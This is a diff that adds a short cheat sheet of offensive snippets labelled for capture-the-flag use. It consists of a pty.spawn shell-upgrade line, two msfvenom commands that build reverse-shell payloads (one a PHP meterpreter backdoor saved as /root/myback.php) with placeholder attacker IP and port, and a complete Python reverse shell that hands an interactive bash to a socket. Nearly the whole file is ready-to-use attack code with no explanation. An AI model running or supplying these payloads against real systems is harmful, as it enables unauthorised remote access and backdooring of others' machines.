@@ -1,0 +1,27 @@
+import pty;
+pty.spawn("/bin/bash");
+
+
+
+////
+
+
+msfvenom -p cmd/unix/reverse_python LHOST=YourİP LPORT=YourPORT R
+
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=YourIP LPORT=YourPORT -f R -o /root/myback.php
+
+
+/////
+
+
+python reverse shell CTF
+
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("127.0.0.1",4545))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
